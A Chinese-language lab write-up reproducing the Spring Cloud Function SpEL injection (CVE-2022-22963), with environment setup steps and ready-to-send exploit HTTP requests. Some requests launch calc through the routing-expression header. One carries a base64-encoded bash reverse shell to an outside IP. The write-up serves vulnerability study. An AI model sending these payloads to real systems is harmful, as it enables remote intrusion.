# Spring Cloud Function SpEL表达式注入



# 漏洞概述

Spring Cloud Function 是基于Spring Boot 的函数计算框架（FaaS），该项目提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。它抽象出所有传输细节和基础架构，允许开发人员保留所有熟悉的工具和流程，并专注于业务逻辑。
在版本3.0.0到当前最新版本3.2.2(commit dc5128b)，默认配置下，都存在Spring Cloud Function SpEL表达式注入漏洞。



# 影响版本
> 3.x<=v3.2.2



# 环境搭建1 - Windows
测试版本：`spring-cloud-function-web 3.2.2`

社区版IDEA配置，在settings中plugins中搜索spring Assistant，安装

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648561872025-16b39db7-d044-48e5-80ba-08c87b8acb6b.png#clientId=u5b12fd36-c309-4&from=paste&height=445&id=u497c9a48&margin=%5Bobject%20Object%5D&name=image.png&originHeight=890&originWidth=1227&originalType=binary&ratio=1&size=117839&status=done&style=none&taskId=u94a1c777-c9a6-49b0-85e6-ca23018bca9&width=613.5)

创建一个Spring Initializr项目，这里使用JDK1.8

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648562018543-45c2fd6a-60f3-4881-99f4-e02c13b18204.png#clientId=u5b12fd36-c309-4&from=paste&height=418&id=ue280a4f2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=836&originWidth=1002&originalType=binary&ratio=1&size=47799&status=done&style=none&taskId=u6d86d62e-5d6b-4523-be53-f5adfbeb3d6&width=501)![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648562930404-565a6005-8aee-4d80-9010-c0e8804aea4c.png#clientId=u5b12fd36-c309-4&from=paste&height=418&id=ub99d6fd3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=836&originWidth=1002&originalType=binary&ratio=1&size=45236&status=done&style=none&taskId=u0b72f8b5-f3e0-4152-81cb-0db00b1274b&width=501)

选择Spring Web和Function作为依赖项，点击Next->Finish

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648562589621-53e3c3d1-419e-46fd-89e4-ca55ca55dc7c.png#clientId=u5b12fd36-c309-4&from=paste&height=418&id=u43968741&margin=%5Bobject%20Object%5D&name=image.png&originHeight=836&originWidth=1002&originalType=binary&ratio=1&size=49678&status=done&style=none&taskId=u603f48be-aadd-446a-b5dc-c3604b99fc2&width=501)![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648562648138-37b5c54c-10cf-45d1-85ce-8f7632256685.png#clientId=u5b12fd36-c309-4&from=paste&height=418&id=u66e9348c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=836&originWidth=1002&originalType=binary&ratio=1&size=63260&status=done&style=none&taskId=uf2cd748f-2a91-42ab-a291-774eaf9fff1&width=501)

漏洞环境搭建完成。在官方出新版本后想要复现此漏洞，那么需要修改pom中spring-cloud-function-web的版本为3.2.2，然后Reload project，如下图所示：

![image](https://user-images.githubusercontent.com/84888757/161368569-5d6eae31-029f-4b7d-9aeb-c78ba516ef51.png)


确认项目中的spring-cloud-function-web是存在漏洞版本后，就可以直接启动项目了，无需进行任何修改。（相当于后面提到的**第2种**利用）

启动项目

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648571080058-964c5042-efa8-4453-8a0b-662fe018504c.png#clientId=ue6416bed-6ec2-4&from=paste&id=u53703f85&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1917&originalType=binary&ratio=1&size=230683&status=done&style=none&taskId=uedf2f0f6-0d60-4fda-9308-20b41d3d6f8)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648571149730-46de503d-c5f4-4a73-8670-41acd6b79a50.png#clientId=ue6416bed-6ec2-4&from=paste&height=258&id=u0e695281&margin=%5Bobject%20Object%5D&name=image.png&originHeight=258&originWidth=694&originalType=binary&ratio=1&size=21998&status=done&style=none&taskId=u23fc699f-b58b-42bf-86e5-8c10880db23&width=694)





## 第1种利用：需要修改配置+任意路由
```php
POST /axin HTTP/1.1
Host: 127.0.0.1:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
Content-Length: 12

test0xin rce
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648577745122-5a60c78f-8a48-40d6-977b-a7c45dbcb23f.png#clientId=u782acaee-1c0f-4&from=paste&height=384&id=btRFS&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=1170&originalType=binary&ratio=1&size=104584&status=done&style=none&taskId=ud9dc7627-79b8-4f2c-b71a-564ca6e8ec5&width=1170)

## 第2种利用：默认配置+特定路由
**为什么会有`/functionRouter`这个路由？**（p神的解答）

官方注册了一个Bean，对应到Spring Cloud Function里就是一个“函数”。
具体可看[/functionRouter路由来源](https://github.com/spring-cloud/spring-cloud-function/blob/28f32d473b079d6eba64169d1547830064020524/spring-cloud-function-context/src/main/java/org/springframework/cloud/function/context/config/ContextFunctionCatalogAutoConfiguration.java#L143)

![image](https://user-images.githubusercontent.com/84888757/162112225-2e5361e5-783c-4394-a1d0-c356776685fd.png)

**复现过程如下**
```php
POST /functionRouter HTTP/1.1
Host: 127.0.0.1:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc")
Content-Length: 9

test0 rce
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648577305263-4866d023-9358-4e32-84d8-27a6f3a67fff.png#clientId=u782acaee-1c0f-4&from=paste&height=568&id=jvCt8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=568&originWidth=1318&originalType=binary&ratio=1&size=84628&status=done&style=none&taskId=u227906d2-e89f-4357-bda3-913ac50346f&width=1318)



---

# 环境搭建2 - Linux
[https://github.com/RanDengShiFu/CVE-2022-22963](https://github.com/RanDengShiFu/CVE-2022-22963)
```shell
docker run -p 9000:9000 --name=CVE-2022-22963 --restart=always -v /poc/CVE-2022-22963/Spring-Cloud-Function-SPEL-RCE/SpringCloud-Function-0.0.1-SNAPSHOT.jar:/root/SpringCloud-Function-0.0.1-SNAPSHOT.jar tomcat:10.1-jdk17-temurin java -jar /root/SpringCloud-Function-0.0.1-SNAPSHOT.jar
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648721821979-8bbeaa84-1f28-44f6-8b62-445042b5bc6d.png#clientId=u8b1a754e-2b21-4&from=paste&id=u3f7ecee2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=607&originalType=binary&ratio=1&size=14637&status=done&style=none&taskId=u107f17d4-3068-450e-994f-d730779e960)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648721012401-0b6837b4-2e07-4c6a-9bed-f88b1fe88fa3.png#clientId=u8b1a754e-2b21-4&from=paste&id=u4e494d87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=1841&originalType=binary&ratio=1&size=189860&status=done&style=none&taskId=u6d401ccb-6212-4802-b779-cd65603096d)

## 漏洞利用
🔗 [POC&EXP](https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE)

从exp提取信息，其实就是环境搭建1中 - 第2种利用方式替换了base64编码后的命令
```shell
POST /functionRouter HTTP/1.1
Host: 192.168.210.164:9000
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMjEwLjE1Mi84OTg5IDA+JjE=}|{base64,-d}|{bash,-i}")
Content-Length: 9

test3 rce
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648723740684-96bbd3c6-2075-4df2-a63c-cef23e0c6a84.png#clientId=u8b1a754e-2b21-4&from=paste&id=uc4da417a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=288&originWidth=1176&originalType=binary&ratio=1&size=48810&status=done&style=none&taskId=uf47efaaf-adac-484f-b1bd-b9487cee218)
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1648723613338-76908e3c-afac-435d-be0e-df5c2cecb161.png#clientId=u8b1a754e-2b21-4&from=paste&id=uf2d5536d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=611&originalType=binary&ratio=1&size=36051&status=done&style=none&taskId=uf0bb297f-3302-42bf-b636-0e44fa82d75)



# 参考链接
- [https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg](https://mp.weixin.qq.com/s/U7YJ3FttuWSOgCodVSqemg)
- [https://mp.weixin.qq.com/s/MiKWnGuyXTTLQVKjq2E_Gw](https://mp.weixin.qq.com/s/MiKWnGuyXTTLQVKjq2E_Gw)
- [https://mp.weixin.qq.com/s/ssHcLC72wZqzt-ei_ZoLwg](https://mp.weixin.qq.com/s/ssHcLC72wZqzt-ei_ZoLwg)
- [https://mp.weixin.qq.com/s/APiXRwSiEanoIuohjwkoEw](https://mp.weixin.qq.com/s/APiXRwSiEanoIuohjwkoEw)


